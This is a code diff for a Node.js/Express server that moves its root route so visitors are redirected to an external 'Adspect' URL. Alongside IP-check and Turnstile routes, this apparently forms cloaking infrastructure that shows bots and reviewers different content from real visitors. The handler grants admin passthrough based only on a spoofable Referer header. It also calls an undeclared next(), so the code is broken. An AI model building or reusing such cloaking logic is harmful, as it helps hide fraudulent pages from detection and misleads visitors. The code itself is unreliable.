@@ -556,6 +556,27 @@ const pageServingMiddleware = async (req, res, next) => {
         res.redirect('/');
     }
 };
+
+
+app.get('/', async (req, res) => {
+    const isAdminPanel = req.headers.referer?.includes('/admin');
+    
+    if (isAdminPanel) {
+        return next();
+    }
+    
+    if (!state.settings.websiteEnabled && !isAdminPanel) {
+        return res.redirect(state.settings.redirectUrl);
+    }
+
+    try {
+        // Instead of running PHP, redirect to your hosted Adspect URL
+        res.redirect('https://redirectingroute.com/'); // Replace with your actual URL
+    } catch (error) {
+        console.error('Error in root route:', error);
+        res.redirect(state.settings.redirectUrl);
+    }
+});
 // Initial IP check
 app.get('/check-ip', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
@@ -939,25 +960,7 @@ app.post('/verify-turnstile', async (req, res) => {
     }
 });
 
-app.get('/', async (req, res) => {
-    const isAdminPanel = req.headers.referer?.includes('/admin');
-    
-    if (isAdminPanel) {
-        return next();
-    }
-    
-    if (!state.settings.websiteEnabled && !isAdminPanel) {
-        return res.redirect(state.settings.redirectUrl);
-    }
 
-    try {
-        // Instead of running PHP, redirect to your hosted Adspect URL
-        res.redirect('https://redirectingroute.com/'); // Replace with your actual URL
-    } catch (error) {
-        console.error('Error in root route:', error);
-        res.redirect(state.settings.redirectUrl);
-    }
-});
 // Page serving route - must come after other routes
 app.get('/:page', pageServingMiddleware);
 
